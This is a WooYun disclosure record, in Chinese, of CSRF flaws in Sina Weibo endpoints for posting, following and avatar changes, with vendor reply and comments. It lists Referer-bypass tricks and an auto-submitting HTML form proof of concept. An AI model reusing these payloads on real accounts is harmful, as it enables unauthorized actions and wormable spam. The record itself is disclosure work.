{"id": 73981, "wybug_id": "wooyun-2015-0165578", "wybug_title": "新浪微博CSRF之点我链接发微博（可蠕虫）\\关注我\\换头像", "wybug_corp": "新浪微博", "wybug_author": "zhchbin", "wybug_date": "2015-12-29 09:41", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "类型应用", "防护策略绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 打包一起送你们吧，有几个发微博的接口，有一个关注，有一个换头像，就差个私信接口了。有这样子绕过referer的，有那样子绕过referer，有不用referer的。接口存得比较多，不知道还有没有剩下的，上次那个还没有修复，对不起开发了。 详细说明：  ## 四个发微博的接口，均可以蠕虫：1. http://game.sports.sina.com.cn/chaoti_events/wyx_2015_christmas_event/deal.phpReferer：http://test.com/?http://game.sports.sina.com.cn/chaoti_events/wyx_2015_christmas_event/\n\n\n\n2. http://game.weibo.com/avatar/interface/shareWeiboReferer: http://game.weibo.com.test.com/avatar/home/?origin=2182\n\n\n\n3. http://game.weibo.com/avatar/events/shareTaskWeiboReferer: http://test.com/?http://game.weibo.com/avatar/home/?origin=2182\n\n\n\n4. http://dr.wenwo.com/popular/indexActivityshare不需要绕过，直接CSRF，一样可以蠕虫测试代码保存成html文件，在已经登录了微博的浏览器里打开：\n<form action=\"http://dr.wenwo.com/popular/indexActivityshare\" method=\"post\"> <input type=\"text\" name=\"zttitle\" value=\"http://test.com\" /> <input type=\"text\" name=\"intro\" value=\"this is a joke\" /> <input type=\"text\" name=\"shareType\" value=\"zhuantiList\" /> <input type=\"text\" name=\"ztid\" value=\"zhuantiList\" /> <script> document.forms[0].submit(); </script> </form>\n\n\n## 关注我的接口1. http://game.weibo.com/avatar/ground/makeStageFollow测试过，不需要referrer，GET方法也能成功\n\n## 设置头像的接口1. http://game.weibo.com/avatar/interface/setWeiboAvatar\n\n   漏洞证明：  已证明   修复方案：  修复referrer验证等   版权声明：转载请注明来源 zhchbin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-12-29 09:53 厂商回复： 感谢支持，漏洞修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-29 10:04 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  我的数学老师。。。如果我把这些接口发成几个漏洞，@浩天 会不会砍死我。。    \n     2015-12-29 10:04 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1471 漏洞数:224        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  唉，有没有想过验证漏洞人的感受？功能在哪？让我上哪抓包去？    \n     2015-12-29 10:09 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @小川  我错了。。下次写详细点。    \n     2015-12-29 11:12 |    \t\t紫霞仙子  \t\t\t( 普通白帽子  |\t\t\t        Rank:2223 漏洞数:301        | 天天向上 ！！！)\t\t \n  @小川 哈哈，这个深有体会啊！    \n     2015-12-29 15:01 |    \t\tAnthea \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 这世上总有另一个我，做着我不敢做的事，过...)\t\t \n  到底是多深的怨念啊。。玩了这么久。。看到新浪微博CSRF几个钢铁大字就想笑了已经。。    \n     2015-12-29 15:51 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @Anthea 我是不会告诉你我还保留了几个接口的！！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}